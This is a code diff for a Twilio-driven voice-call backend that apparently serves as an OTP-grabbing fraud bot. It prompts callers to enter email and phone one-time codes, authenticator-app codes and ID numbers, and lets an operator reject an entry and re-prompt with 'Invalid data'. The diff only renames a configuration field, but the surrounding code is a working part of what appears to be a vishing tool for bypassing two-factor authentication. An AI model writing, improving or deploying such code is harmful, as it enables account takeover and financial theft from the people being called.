@@ -8,22 +8,22 @@ const client = twilio(process.env.TWILIO_ACCOUNT_SID, process.env.TWILIO_AUTH_TO
 function getActionConfig(action) {
     const configs = {
         'email_otp': {
-            action: 'email-otp',
+            route: 'email-otp',
             message: 'Please enter the 6 digit OTP from your email followed by the pound key.',
             numDigits: 6
         },
         'auth_otp': {
-            action: 'auth-otp',
+            route: 'auth-otp',
             message: 'Please enter the 6 digit code from your authenticator app followed by the pound key.',
             numDigits: 6
         },
         'phone_otp': {
-            action: 'phone-otp',
+            route: 'phone-otp',
             message: 'Please enter the 6 digit OTP sent to your phone followed by the pound key.',
             numDigits: 6
         },
         'id_number': {
-            action: 'id',
+            route: 'id',
             message: 'Please enter your ID number followed by the pound key.',
             numDigits: 20
         }
@@ -68,7 +68,7 @@ router.post('/request-action/:sessionId', async (req, res) => {
         );
         
         if (callSid) {
-            const twiml = `<Response><Say>${actionConfig.message}</Say><Gather numDigits="${actionConfig.numDigits}" action="/webhooks/collect-${actionConfig.action}/${sessionId}" method="POST" finishOnKey="#"/></Response>`;
+            const twiml = `<Response><Say>${actionConfig.message}</Say><Gather numDigits="${actionConfig.numDigits}" action="/webhooks/collect-${actionConfig.route}/${sessionId}" method="POST" finishOnKey="#"/></Response>`;
             await client.calls(callSid).update({ twiml: twiml });
             console.log(`Updated call ${callSid} with new TwiML for action: ${action}`);
         }
@@ -174,30 +174,30 @@ router.post('/reject-last-data/:sessionId', async (req, res) => {
             [`waiting_for_${lastDataType}`, sessionId]
         );
         
-        let actionMessage = '';
+        let route = '';
+        let message = '';
         let numDigits = 20;
-        let actionType = '';
         
         if (lastDataType === 'id_number') {
-            actionMessage = 'Please enter your ID number followed by the pound key.';
+            route = 'id';
+            message = 'Please enter your ID number followed by the pound key.';
             numDigits = 20;
-            actionType = 'id';
         } else if (lastDataType === 'email_otp') {
-            actionMessage = 'Please enter the 6 digit OTP from your email followed by the pound key.';
+            route = 'email-otp';
+            message = 'Please enter the 6 digit OTP from your email followed by the pound key.';
             numDigits = 6;
-            actionType = 'email-otp';
         } else if (lastDataType === 'auth_otp') {
-            actionMessage = 'Please enter the 6 digit code from your authenticator app followed by the pound key.';
+            route = 'auth-otp';
+            message = 'Please enter the 6 digit code from your authenticator app followed by the pound key.';
             numDigits = 6;
-            actionType = 'auth-otp';
         } else if (lastDataType === 'phone_otp') {
-            actionMessage = 'Please enter the 6 digit OTP sent to your phone followed by the pound key.';
+            route = 'phone-otp';
+            message = 'Please enter the 6 digit OTP sent to your phone followed by the pound key.';
             numDigits = 6;
-            actionType = 'phone-otp';
         }
         
         if (callSid) {
-            const twiml = `<Response><Say>Invalid data. ${actionMessage}</Say><Gather numDigits="${numDigits}" action="/webhooks/collect-${actionType}/${sessionId}" method="POST" finishOnKey="#"/></Response>`;
+            const twiml = `<Response><Say>Invalid data. ${message}</Say><Gather numDigits="${numDigits}" action="/webhooks/collect-${route}/${sessionId}" method="POST" finishOnKey="#"/></Response>`;
             await client.calls(callSid).update({ twiml: twiml });
         }
         
